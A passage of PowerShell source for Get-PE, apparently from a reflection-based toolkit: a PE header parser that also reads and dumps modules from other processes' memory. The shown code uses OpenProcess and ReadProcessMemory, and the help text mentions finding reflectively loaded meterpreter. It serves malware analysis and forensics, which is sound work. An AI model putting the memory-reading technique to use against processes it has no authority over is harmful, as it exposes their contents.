            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

        $StructBuilder.CreateType()
    }

    function Get-SystemInfo {
    <#
    .SYNOPSIS

    A wrapper for kernel32!GetSystemInfo

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: PSReflect module
    Optional Dependencies: None
    #>

        $Mod = New-InMemoryModule -ModuleName SysInfo

        $ProcessorType = psenum $Mod SYSINFO.PROCESSOR_ARCH UInt16 @{
            PROCESSOR_ARCHITECTURE_INTEL =   0
            PROCESSOR_ARCHITECTURE_MIPS =    1
            PROCESSOR_ARCHITECTURE_ALPHA =   2
            PROCESSOR_ARCHITECTURE_PPC =     3
            PROCESSOR_ARCHITECTURE_SHX =     4
            PROCESSOR_ARCHITECTURE_ARM =     5
            PROCESSOR_ARCHITECTURE_IA64 =    6
            PROCESSOR_ARCHITECTURE_ALPHA64 = 7
            PROCESSOR_ARCHITECTURE_AMD64 =   9
            PROCESSOR_ARCHITECTURE_UNKNOWN = 0xFFFF
        }

        $SYSTEM_INFO = struct $Mod SYSINFO.SYSTEM_INFO @{
            ProcessorArchitecture = field 0 $ProcessorType
            Reserved = field 1 Int16
            PageSize = field 2 Int32
            MinimumApplicationAddress = field 3 IntPtr
            MaximumApplicationAddress = field 4 IntPtr
            ActiveProcessorMask = field 5 IntPtr
            NumberOfProcessors = field 6 Int32
            ProcessorType = field 7 Int32
            AllocationGranularity = field 8 Int32
            ProcessorLevel = field 9 Int16
            ProcessorRevision = field 10 Int16
        }

        $FunctionDefinitions = @(
            (func kernel32 GetSystemInfo ([Void]) @($SYSTEM_INFO.MakeByRefType()))
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32SysInfo'
        $Kernel32 = $Types['kernel32']

        $SysInfo = [Activator]::CreateInstance($SYSTEM_INFO)
        $Kernel32::GetSystemInfo([Ref] $SysInfo)

        $SysInfo
    }

    function Get-PE
    {
    <#
    .SYNOPSIS

    An on-disk and in-memory PE parser and process dumper.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: PSReflect module
                           Get-SystemInfo
                           Get-VirtualMemoryInfo
    Optional Dependencies: Get-PE.format.ps1xml

    .DESCRIPTION

    Get-PE parses the PE header of modules in memory and on disk
    and optionally dumps in-memory PEs to disk. When PEs are dumped to
    disk, they are properly fixed up: import table reconstructed,
    relocated addresses recovered, and sections are placed in their
    proper file alignment.

    .PARAMETER FilePath

    Specifies the path to the portable executable file on disk.

    .PARAMETER FileBytes

    Specifies an array of bytes consisting of a portable executable.

    .PARAMETER ProcessID

    Specifies the process ID.

    .PARAMETER Module

    Specifies the process module. This parameter is used in pipeline
    expressions in conjunction with Get-Process.

    .PARAMETER ModuleBaseAddress

    The base address of the module to be parsed.

    .PARAMETER IgnoreMalformedPE

    Specifies that you do not want to stop parsing the PE header if a
    malformed header is detected.

    .EXAMPLE

    ls C:\Windows\System32\* -Include *.dll, *.exe | Get-PE

    .EXAMPLE

    Get-PE -FilePath tiny.exe -IgnoreMalformedPE

    .EXAMPLE

    C:\PS> $PEBytes = [IO.File]::ReadAllBytes('C:\Windows\System32\ntdll.dll')
    C:\PS> Get-PE -FileBytes $PEBytes

    .EXAMPLE

    Get-Process cmd | Get-PE

    Description
    -----------
    Returns the full PE headers of every loaded module in memory

    .EXAMPLE

    Get-Process evilprocess | Get-PE -DumpDirectory $PWD

    Description
    -----------
    Parses the PE headers of every loaded module in memory and dumps them
    to disk.

    .EXAMPLE

    C:\PS> $Proc = Get-Process cmd
    C:\PS> $Kernel32Base = ($Proc.Modules | Where-Object {$_.ModuleName -eq 'kernel32.dll'}).BaseAddress
    C:\PS> Get-PE -ProcessId $Proc.Id -ModuleBaseAddress $Kernel32Base

    Description
    -----------
    A PE header is returned upon providing the module's base address.
    This technique would be useful for dumping the PE header of a rogue
    module that is invisible to Windows - e.g. a reflectively loaded
    meterpreter binary (metsrv.dll).

    .EXAMPLE

    C:\PS> $Proc = Get-Process Skype
    C:\PS> $skype = $Proc.Modules | ? {$_.ModuleName -eq 'Skype.exe'}
    C:\PS> $Get-PE -ProcessID $Proc.ID -ModuleBaseAddress $skype.BaseAddress -DumpDirectory $PWD -Verbose

    Description
    -----------
    Parse the PE header of Skype.exe (a packed executable) and dump the unpacked version to disk.

    .OUTPUTS

    System.Management.Automation.PSObject, System.IO.FileInfo

    Get-PE returns a parsed PE header in the form of a PSObject by
    default. If the DumpDirectory parameter is specified, a FileInfo
    object is returned representing the dumped PE file on disk.

    .NOTES

    The PE dumping capability is packer agnostic and doesn't claim to be
    an unpacker for any arbitrary packer. It simply saves the file
    representation of an in-memory module based on the information
    reported in its PE header. If a packer intentionally malforms the PE
    header after being loaded, Get-PE cannot guarantee a clean,
    unpacked representation of the module.

    In other words, don't ask for Get-PE to support a specific
    packer. If it throws bizarre errors upon trying to parse an unpacked
    PE however, please provide a detailed explanation of what you believe
    the root cause to be by filing an issue on GitHub or send the MD5
    and/or sample to matt <at> exploit-monday <dot> com.

    Known issues:
    1) If a PE in memory is mapped MEM_PRIVATE, Get-PE will treat
       it as a loaded image. If it is a mapped image (i.e. not loaded),
       Get-PE will fail to parse it.
    2) Get-PE only reads from the bounds of the PE header and each
       defined section. If data exists between sections or is appended to
       the end of the calculated PE size, it will be ignored.
    3) ValueFromPipeline is set in the FileBytes parameter. This was
       necessary due to a stupid PSv2 bug. Just don't pass a byte array
       to Get-PE via the pipeline.
    #>

        [CmdletBinding(DefaultParameterSetName = 'OnDisk')] Param(
            [Parameter(Mandatory = $True,
                       ParameterSetName = 'OnDisk',
                       Position = 0,
                       ValueFromPipelineByPropertyName = $True,
                       ValueFromPipeline = $True)]
            [Alias('FullName')]
            [String[]]
            $FilePath,

            [Parameter(ParameterSetName = 'InMemory',
                       Position = 0,
                       Mandatory = $True,
                       ValueFromPipelineByPropertyName = $True)]
            [Alias('Id')]
            [ValidateScript({Get-Process -Id $_})]
            [Int32]
            $ProcessID,

            [Parameter(ParameterSetName = 'InMemory',
                       Position = 1)]
            [IntPtr]
            $ModuleBaseAddress,

            [Parameter(ParameterSetName = 'InMemory',
                       Position = 2,
                       ValueFromPipelineByPropertyName = $True)]
            [Alias('MainModule')]
            [Alias('Modules')]
            [Diagnostics.ProcessModule[]]
            $Module,
        
            [Parameter(ParameterSetName = 'InMemory')]
            [String]
            [ValidateScript({[IO.Directory]::Exists((Resolve-Path $_).Path)})]
            $DumpDirectory,

            [Parameter(Mandatory = $True,
                       ParameterSetName = 'ByteArray',
                       Position = 0,
                       ValueFromPipeline = $True)]
            [Byte[]]
            $FileBytes,

            [Parameter()]
            [Switch]
            $IgnoreMalformedPE
        )

        BEGIN
        {
            function local:Test-Pointer
            {
            <#
            .SYNOPSIS

            Helper function used to validate that a memory dereference does not
            occur beyond the bounds of what was allocated.

            Author: Joe Bialek (@JosephBialek)
            #>

                Param (
                    [Parameter(Position = 0, Mandatory = $True)] [Int64] $Ptr,
                    [Parameter(Position = 1, Mandatory = $True)] [Int64] $PtrDerefSize,
                    [Parameter(Position = 2, Mandatory = $True)] [Int64] $PValidMem,
                    [Parameter(Position = 3, Mandatory = $True)] [Int64] $ValidMemSize
                )

                $EndPtr = $Ptr + $PtrDerefSize
                $EndValidMem = $PValidMem + $ValidMemSize
                if (($Ptr -ge $PValidMem)    -and
                    ($EndPtr -ge $PValidMem) -and
                    ($Ptr -le $EndValidMem)  -and
                    ($EndPtr -le $EndValidMem)) {
                    return $True
                }

                return $False
            }

            # Helper function for dealing with on-disk PEs.
            function local:Convert-RVAToFileOffset([IntPtr] $Rva, $SectionHeaders, $PEBase) {
                foreach ($Section in $SectionHeaders) {
                    if ((($Rva.ToInt64() - $PEBase.ToInt64()) -ge $Section.VirtualAddress) -and
                        (($Rva.ToInt64() - $PEBase.ToInt64()) -lt ($Section.VirtualAddress + $Section.VirtualSize))) {
                        return [IntPtr] ($Rva.ToInt64() - ($Section.VirtualAddress - $Section.PointerToRawData))
                    }
                }
        
                # Pointer did not fall in the address ranges of the section headers
                return $Rva
            }

            #region Define PE structs and enums
            $Mod = New-InMemoryModule -ModuleName PEParser

            $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
                DOS_SIGNATURE =    0x5A4D
                OS2_SIGNATURE =    0x454E
                OS2_SIGNATURE_LE = 0x454C
                VXD_SIGNATURE =    0x454C
            }

            $ImageFileMachine = psenum $Mod PE.IMAGE_FILE_MACHINE UInt16 @{
                UNKNOWN =   0x0000
                I386 =      0x014C # Intel 386.
                R3000 =     0x0162 # MIPS little-endian =0x160 big-endian
                R4000 =     0x0166 # MIPS little-endian
                R10000 =    0x0168 # MIPS little-endian
                WCEMIPSV2 = 0x0169 # MIPS little-endian WCE v2
                ALPHA =     0x0184 # Alpha_AXP
                SH3 =       0x01A2 # SH3 little-endian
                SH3DSP =    0x01A3
                SH3E =      0x01A4 # SH3E little-endian
                SH4 =       0x01A6 # SH4 little-endian
                SH5 =       0x01A8 # SH5
                ARM =       0x01C0 # ARM Little-Endian
                THUMB =     0x01C2
                ARMNT =     0x01C4 # ARM Thumb-2 Little-Endian
                AM33 =      0x01D3
                POWERPC =   0x01F0 # IBM PowerPC Little-Endian
                POWERPCFP = 0x01F1
                IA64 =      0x0200 # Intel 64
                MIPS16 =    0x0266 # MIPS
                ALPHA64 =   0x0284 # ALPHA64
                MIPSFPU =   0x0366 # MIPS
                MIPSFPU16 = 0x0466 # MIPS
                TRICORE =   0x0520 # Infineon
                CEF =       0x0CEF
                EBC =       0x0EBC # EFI public byte Code
                AMD64 =     0x8664 # AMD64 (K8)
                M32R =      0x9041 # M32R little-endian
                CEE =       0xC0EE
            }

            $ImageFileCharacteristics = psenum $Mod PE.IMAGE_FILE_CHARACTERISTICS UInt16 @{
                IMAGE_RELOCS_STRIPPED =         0x0001 # Relocation info stripped from file.
                IMAGE_EXECUTABLE_IMAGE =        0x0002 # File is executable  (i.e. no unresolved external references).
                IMAGE_LINE_NUMS_STRIPPED =      0x0004 # Line nunbers stripped from file.
                IMAGE_LOCAL_SYMS_STRIPPED =     0x0008 # Local symbols stripped from file.
                IMAGE_AGGRESIVE_WS_TRIM =       0x0010 # Agressively trim working set
                IMAGE_LARGE_ADDRESS_AWARE =     0x0020 # App can handle >2gb addresses
                IMAGE_REVERSED_LO =             0x0080 # public bytes of machine public ushort are reversed.
                IMAGE_32BIT_MACHINE =           0x0100 # 32 bit public ushort machine.
                IMAGE_DEBUG_STRIPPED =          0x0200 # Debugging info stripped from file in .DBG file
                IMAGE_REMOVABLE_RUN_FROM_SWAP = 0x0400 # If Image is on removable media copy and run from the swap file.
                IMAGE_NET_RUN_FROM_SWAP =       0x0800 # If Image is on Net copy and run from the swap file.
                IMAGE_SYSTEM =                  0x1000 # System File.
                IMAGE_DLL =                     0x2000 # File is a DLL.
                IMAGE_UP_SYSTEM_ONLY =          0x4000 # File should only be run on a UP machine
                IMAGE_REVERSED_HI =             0x8000 # public bytes of machine public ushort are reversed.
            } -Bitfield

            $ImageHdrMagic = psenum $Mod PE.IMAGE_NT_OPTIONAL_HDR_MAGIC UInt16 @{
                PE32 = 0x010B
                PE64 = 0x020B
            }

            $ImageNTSig = psenum $Mod PE.IMAGE_NT_SIGNATURE UInt32 @{
                VALID_PE_SIGNATURE = 0x00004550
            }

            $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
                UNKNOWN =                  0
                NATIVE =                   1 # Image doesn't require a subsystem.
                WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
                WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
                OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
                POSIX_CUI =                7 # Image runs in the Posix character subsystem.
                NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
                WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
                EFI_APPLICATION =          10
                EFI_BOOT_SERVICE_DRIVER =  11
                EFI_RUNTIME_DRIVER =       12
                EFI_ROM =                  13
                XBOX =                     14
                WINDOWS_BOOT_APPLICATION = 16
            }

            $ImageDllCharacteristics = psenum $Mod PE.IMAGE_DLLCHARACTERISTICS UInt16 @{
                HIGH_ENTROPY_VA =       0x0020 # Opts in to high entropy ASLR
                DYNAMIC_BASE =          0x0040 # DLL can move.
                FORCE_INTEGRITY =       0x0080 # Code Integrity Image
                NX_COMPAT =             0x0100 # Image is NX compatible
                NO_ISOLATION =          0x0200 # Image understands isolation and doesn't want it
                NO_SEH =                0x0400 # Image does not use SEH. No SE handler may reside in this image
                NO_BIND =               0x0800 # Do not bind this image.
                WDM_DRIVER =            0x2000 # Driver uses WDM model
                TERMINAL_SERVER_AWARE = 0x8000
            } -Bitfield

            $ImageScn = psenum $Mod PE.IMAGE_SCN Int32 @{
                TYPE_NO_PAD =               0x00000008
                CNT_CODE =                  0x00000020
                CNT_INITIALIZED_DATA =      0x00000040
                CNT_UNINITIALIZED_DATA =    0x00000080
                LNK_INFO =                  0x00000200
                LNK_REMOVE =                0x00000800
                LNK_COMDAT =                0x00001000
                NO_DEFER_SPEC_EXC =         0x00004000
                GPREL =                     0x00008000
                MEM_FARDATA =               0x00008000
                MEM_PURGEABLE =             0x00020000
                MEM_16BIT =                 0x00020000
                MEM_LOCKED =                0x00040000
                MEM_PRELOAD =               0x00080000
                ALIGN_1BYTES =              0x00100000
                ALIGN_2BYTES =              0x00200000
                ALIGN_4BYTES =              0x00300000
                ALIGN_8BYTES =              0x00400000
                ALIGN_16BYTES =             0x00500000
                ALIGN_32BYTES =             0x00600000
                ALIGN_64BYTES =             0x00700000
                ALIGN_128BYTES =            0x00800000
                ALIGN_256BYTES =            0x00900000
                ALIGN_512BYTES =            0x00A00000
                ALIGN_1024BYTES =           0x00B00000
                ALIGN_2048BYTES =           0x00C00000
                ALIGN_4096BYTES =           0x00D00000
                ALIGN_8192BYTES =           0x00E00000
                ALIGN_MASK =                0x00F00000
                LNK_NRELOC_OVFL =           0x01000000
                MEM_DISCARDABLE =           0x02000000
                MEM_NOT_CACHED =            0x04000000
                MEM_NOT_PAGED =             0x08000000
                MEM_SHARED =                0x10000000
                MEM_EXECUTE =               0x20000000 # Section is executable.
                MEM_READ =                  0x40000000 # Section is readable.
                MEM_WRITE =                 0x80000000 # Section is writeable.
            } -Bitfield

            $ImageReloc = psenum $Mod PE.IMAGE_RELOC Int16 @{
                ABSOLUTE = 0
                HIGH =     1
                LOW =      2
                HIGHLOW =  3
                HIGHADJ =  4
                DIR64 =    10
            }

            $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
                e_magic =    field 0 $ImageDosSignature
                e_cblp =     field 1 UInt16
                e_cp =       field 2 UInt16
                e_crlc =     field 3 UInt16
                e_cparhdr =  field 4 UInt16
                e_minalloc = field 5 UInt16
                e_maxalloc = field 6 UInt16
                e_ss =       field 7 UInt16
                e_sp =       field 8 UInt16
                e_csum =     field 9 UInt16
                e_ip =       field 10 UInt16
                e_cs =       field 11 UInt16
                e_lfarlc =   field 12 UInt16
                e_ovno =     field 13 UInt16
                e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
                e_oemid =    field 15 UInt16
                e_oeminfo =  field 16 UInt16
                e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
                e_lfanew =   field 18 Int32
            }

            $ImageFileHeader = struct $Mod PE.IMAGE_FILE_HEADER @{
                Machine =              field 0 $ImageFileMachine
                NumberOfSections =     field 1 UInt16
                TimeDateStamp =        field 2 UInt32
                PointerToSymbolTable = field 3 UInt32
                NumberOfSymbols =      field 4 UInt32
                SizeOfOptionalHeader = field 5 UInt16
                Characteristics  =     field 6 $ImageFileCharacteristics
            }

            $PeImageDataDir = struct $Mod PE.IMAGE_DATA_DIRECTORY @{
                VirtualAddress = field 0 UInt32
                Size =           field 1 UInt32
            }

            $ImageOptionalHdr = struct $Mod PE.IMAGE_OPTIONAL_HEADER @{
                Magic =                       field 0 $ImageHdrMagic
                MajorLinkerVersion =          field 1 Byte
                MinorLinkerVersion =          field 2 Byte
                SizeOfCode =                  field 3 UInt32
                SizeOfInitializedData =       field 4 UInt32
                SizeOfUninitializedData =     field 5 UInt32
                AddressOfEntryPoint =         field 6 UInt32
                BaseOfCode =                  field 7 UInt32
                BaseOfData =                  field 8 UInt32
                ImageBase =                   field 9 UInt32
                SectionAlignment =            field 10 UInt32
                FileAlignment =               field 11 UInt32
                MajorOperatingSystemVersion = field 12 UInt16
                MinorOperatingSystemVersion = field 13 UInt16
                MajorImageVersion =           field 14 UInt16
                MinorImageVersion =           field 15 UInt16
                MajorSubsystemVersion =       field 16 UInt16
                MinorSubsystemVersion =       field 17 UInt16
                Win32VersionValue =           field 18 UInt32
                SizeOfImage =                 field 19 UInt32
                SizeOfHeaders =               field 20 UInt32
                CheckSum =                    field 21 UInt32
                Subsystem =                   field 22 $ImageSubsystem
                DllCharacteristics =          field 23 $ImageDllCharacteristics
                SizeOfStackReserve =          field 24 UInt32
                SizeOfStackCommit =           field 25 UInt32
                SizeOfHeapReserve =           field 26 UInt32
                SizeOfHeapCommit =            field 27 UInt32
                LoaderFlags =                 field 28 UInt32
                NumberOfRvaAndSizes =         field 29 UInt32
                DataDirectory =               field 30 $PeImageDataDir.MakeArrayType() -MarshalAs @('ByValArray', 16)
            }

            $ImageOptionalHdr64 = struct $Mod PE.IMAGE_OPTIONAL_HEADER64 @{
                Magic =                       field 0 $ImageHdrMagic
                MajorLinkerVersion =          field 1 Byte
                MinorLinkerVersion =          field 2 Byte
                SizeOfCode =                  field 3 UInt32
                SizeOfInitializedData =       field 4 UInt32
                SizeOfUninitializedData =     field 5 UInt32
                AddressOfEntryPoint =         field 6 UInt32
                BaseOfCode =                  field 7 UInt32
                ImageBase =                   field 8 UInt64
                SectionAlignment =            field 9 UInt32
                FileAlignment =               field 10 UInt32
                MajorOperatingSystemVersion = field 11 UInt16
                MinorOperatingSystemVersion = field 12 UInt16
                MajorImageVersion =           field 13 UInt16
                MinorImageVersion =           field 14 UInt16
                MajorSubsystemVersion =       field 15 UInt16
                MinorSubsystemVersion =       field 16 UInt16
                Win32VersionValue =           field 17 UInt32
                SizeOfImage =                 field 18 UInt32
                SizeOfHeaders =               field 19 UInt32
                CheckSum =                    field 20 UInt32
                Subsystem =                   field 21 $ImageSubsystem
                DllCharacteristics =          field 22 $ImageDllCharacteristics
                SizeOfStackReserve =          field 23 UInt64
                SizeOfStackCommit =           field 24 UInt64
                SizeOfHeapReserve =           field 25 UInt64
                SizeOfHeapCommit =            field 26 UInt64
                LoaderFlags =                 field 27 UInt32
                NumberOfRvaAndSizes =         field 28 UInt32
                DataDirectory =               field 29 $PeImageDataDir.MakeArrayType() -MarshalAs @('ByValArray', 16)
            }

            $ImageNTHdrs = struct $Mod PE.IMAGE_NT_HEADERS @{
                Signature =      field 0 $ImageNTSig
                FileHeader =     field 1 $ImageFileHeader
                OptionalHeader = field 2 $ImageOptionalHdr
            }

            $ImageNTHdrs64 = struct $Mod PE.IMAGE_NT_HEADERS64 @{
                Signature =      field 0 $ImageNTSig
                FileHeader =     field 1 $ImageFileHeader
                OptionalHeader = field 2 $ImageOptionalHdr64
            }

            $ImageSectionHdr = struct $Mod PE.IMAGE_SECTION_HEADER @{
                Name =                 field 0 String -MarshalAs @('ByValTStr', 7)
                VirtualSize =          field 1 UInt32
                VirtualAddress =       field 2 UInt32
                SizeOfRawData =        field 3 UInt32
                PointerToRawData =     field 4 UInt32
                PointerToRelocations = field 5 UInt32
                PointerToLinenumbers = field 6 UInt32
                NumberOfRelocations =  field 7 UInt16
                NumberOfLinenumbers =  field 8 UInt16
                Characteristics =      field 9 $ImageScn
            }

            $ImageExportDir = struct $Mod PE.IMAGE_EXPORT_DIRECTORY @{
                Characteristics =       field 0 UInt32
                TimeDateStamp =         field 1 UInt32
                MajorVersion =          field 2 UInt16
                MinorVersion =          field 3 UInt16
                Name =                  field 4 UInt32
                Base =                  field 5 UInt32
                NumberOfFunctions =     field 6 UInt32
                NumberOfNames =         field 7 UInt32
                AddressOfFunctions =    field 8 UInt32
                AddressOfNames =        field 9 UInt32
                AddressOfNameOrdinals = field 10 UInt32
            }

            $ImageImportDescriptor = struct $Mod PE.IMAGE_IMPORT_DESCRIPTOR @{
                OriginalFirstThunk = field 0 UInt32
                TimeDateStamp =      field 1 UInt32
                ForwarderChain =     field 2 UInt32
                Name =               field 3 UInt32
                FirstThunk =         field 4 UInt32
            }

            $ImageThunkData = struct $Mod PE.IMAGE_THUNK_DATA @{
                AddressOfData = field 0 Int32
            }

            $ImageThunkData64 = struct $Mod PE.IMAGE_THUNK_DATA64 @{
                AddressOfData = field 0 Int64
            }
        
            $ImageImportByName = struct $Mod PE.IMAGE_IMPORT_BY_NAME @{
                Hint = field 0 UInt16
                Name = field 1 char
            }

            $FunctionDefinitions = @(
                (func kernel32 GetLastError ([Int32]) @()),
                (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
                (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
                (func kernel32 ReadProcessMemory ([Bool]) @([IntPtr], [IntPtr], [IntPtr], [Int], [Int].MakeByRefType()) -SetLastError),
                (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
                (func kernel32 GetModuleFileNameEx ([Int]) @([Int], [IntPtr], [Text.StringBuilder], [Int]) -SetLastError),
                (func kernel32 K32GetModuleFileNameEx ([Int]) @([Int], [IntPtr], [Text.StringBuilder], [Int]) -SetLastError),
                (func ntdll memset ([Void]) @([IntPtr], [Int], [Int]))
            )

            $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32PEParser'
            $Kernel32 = $Types['kernel32']
            $Ntdll = $Types['ntdll']
            #endregion

            $FullDumpPath = $null
            if ($DumpDirectory) { $FullDumpPath = (Resolve-Path $DumpDirectory).Path }
        }

        PROCESS
        {
            # Obtain the default OS memory page size
            $SystemInfo = Get-SystemInfo

            $ImageParsingFailed = $False

            switch ($PsCmdlet.ParameterSetName) {
                'OnDisk' {
                    if ($FilePath.Length -gt 1) {
                        foreach ($Path in $FilePath) { Get-PE -FilePath $Path }
                    }
            
                    if (!(Test-Path $FilePath)) {
                        Write-Warning "Invalid path or file does not exist: $FilePath"
                        return
                    }
            
                    $FilePath = (Resolve-Path $FilePath).Path
            
                    $ModuleName = $FilePath
                    # Treat a byte array as if it were a file on disk
                    $ImageType = 'File'
                    $ProcessID = $PID

                    $FileByteArray = [IO.File]::ReadAllBytes($FilePath)
                    $PELen = $FileByteArray.Length
                    # Pin the byte array in memory (i.e. do not garbage collect)
                    # so you can reliably dereference it.
                    $Handle = [Runtime.InteropServices.GCHandle]::Alloc($FileByteArray, 'Pinned')
                    $PEHeaderAddr = $Handle.AddrOfPinnedObject()
                    if (!$PEHeaderAddr) { throw 'Unable to allocate local memory to store a copy of the PE header.' }
                }

                'ByteArray' {
                    # The module name cannot be determined if a byte array is provided
                    $ModuleName = ''
                    $ImageType = 'File'
                    $ProcessID = $PID

                    $PELen = $FileBytes.Length
                    # Pin the byte array in memory (i.e. do not garbage collect)
                    # so you can reliably dereference it.
                    $Handle = [Runtime.InteropServices.GCHandle]::Alloc($FileBytes, 'Pinned')
                    $PEHeaderAddr = $Handle.AddrOfPinnedObject()
                    if (!$PEHeaderAddr) { throw 'Unable to allocate local memory to store a copy of the PE header.' }
                }

                'InMemory' {
                    if ($Module.Length -gt 1) {
                        foreach ($Mod in $Module) {
                            $BaseAddr = $Mod.BaseAddress
                            if ($DumpDirectory) {
                                Get-PE -ProcessID $ProcessID -Module $Mod -ModuleBaseAddress $BaseAddr -DumpDirectory $DumpDirectory
                            } else {
                                Get-PE -ProcessID $ProcessID -Module $Mod -ModuleBaseAddress $BaseAddr
                            }
                        }
                    }

                    if (-not $ModuleBaseAddress) { return }

                    # Default to a loaded image unless determined otherwise
                    $ImageType = 'Image'

                    # Size of the memory page allocated for the PE header
                    $HeaderSize = $SystemInfo.PageSize
                    $PELen = $HeaderSize
                    # Allocate space for when the PE header is read from the remote process
                    $PEHeaderAddr = [Runtime.InteropServices.Marshal]::AllocHGlobal($HeaderSize)
                    if (!$PEHeaderAddr) { throw 'Unable to allocate local memory to store a copy of the PE header.' }

                    # Get handle to the process
                    # PROCESS_VM_READ (0x00000010) | PROCESS_QUERY_INFORMATION (0x00000400)
                    $hProcess = $Kernel32::OpenProcess(0x410, $False, $ProcessID)
        
                    if (-not $hProcess) {
                        throw "Unable to get a process handle for process ID: $ProcessID"
                    }

                    if ($Module) {
                        $ModuleName = $Module[0].FileName
                    } else {
                        $FileNameSize = 255
                        $StrBuilder = New-Object Text.StringBuilder $FileNameSize
                        try {
                            # Refer to http://msdn.microsoft.com/en-us/library/windows/desktop/ms683198(v=vs.85).aspx+
                            # This function may not be exported depending on the OS version.
                            $null = $Kernel32::K32GetModuleFileNameEx($hProcess, $ModuleBaseAddress, $StrBuilder, $FileNameSize)
                        } catch {
                            $null = $Kernel32::GetModuleFileNameEx($hProcess, $ModuleBaseAddress, $StrBuilder, $FileNameSize)
                        }

                        $ModuleName = $StrBuilder.ToString()
                    }

                    Write-Verbose "Opened process handle for PID: $ProcessID"
                    Write-Verbose "Processing module: $ModuleName, BaseAddress: 0x$($ModuleBaseAddress.ToString('X16'))"

                    $BytesRead = 0
                    # Read PE header from remote process
                    $Result = $Kernel32::ReadProcessMemory($hProcess,
                                                           $ModuleBaseAddress,
                                                           $PEHeaderAddr,
                                                           $SystemInfo.PageSize,
                                                           [Ref] $BytesRead)

                    if (!$Result) {
                        $VirtualMem = Get-VirtualMemoryInfo -ProcessID $ProcessID -ModuleBaseAddress $ModuleBaseAddress
                        if ($ModuleName) {
                            $ErrorMessage = "Failed to read PE header of $ModuleName. Address: " +
                                            "0x$($ModuleBaseAddress.ToString('X16')), Protect: " +
                                            "$($VirtualMem.Protect), Type: $($VirtualMem.Type)"

                            Write-Error $ErrorMessage
                        } else {
                            $ErrorMessage = "Failed to read PE header of process ID: $ProcessID. " +
                                            "Address: 0x$($ModuleBaseAddress.ToString('X16')), " +
                                            "Protect: $($VirtualMem.Protect), Type: $($VirtualMem.Type)"

                            Write-Error $ErrorMessage
                        }
            
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                        return
                    }
                }
            }

            if (!(Test-Pointer $PEHeaderAddr $ImageDosHeader::GetSize() $PEHeaderAddr $PELen)) {
                Write-Error 'Dereferencing IMAGE_DOS_HEADER will cause an out-of-bounds memory access. Quiting.'

                if ($ImageType -eq 'File') {
                    $Handle.Free()
                } else {
                    $null = $Kernel32::CloseHandle($hProcess)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                }

                return
            }

            $DosHeader = $PEHeaderAddr -as $ImageDosHeader

            if ($DosHeader.e_magic -ne $ImageDosSignature::DOS_SIGNATURE) {
                Write-Warning 'Malformed DOS header detected. File does not contain an MZ signature.'
                if (-not $IgnoreMalformedPE) {
                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                    }

                    return
                }

                $ImageParsingFailed = $True
            }

            if (($DosHeader.e_lfanew -lt 0x40) -or ($DosHeader.e_lfanew % 4 -ne 0) -or ($DosHeader.e_lfanew -gt 360)) {
                Write-Warning 'Malformed DOS header detected. Invalid e_lfanew field.'
                if (-not $IgnoreMalformedPE) {
                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                    }

                    return
                }

                $ImageParsingFailed = $True
            }

            $NtHeaderOffset = [IntPtr] ($PEHeaderAddr.ToInt64() + $DosHeader.e_lfanew)

            if (!(Test-Pointer $NtHeaderOffset $ImageNTHdrs::GetSize() $PEHeaderAddr $PELen)) {
                Write-Error 'Dereferencing IMAGE_NT_HEADERS will cause an out-of-bounds memory access. Quiting.'

                if ($ImageType -eq 'File') {
                    $Handle.Free()
                } else {
                    $null = $Kernel32::CloseHandle($hProcess)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                }

                return
            }

            $NTHeader = $NtHeaderOffset -as $ImageNTHdrs

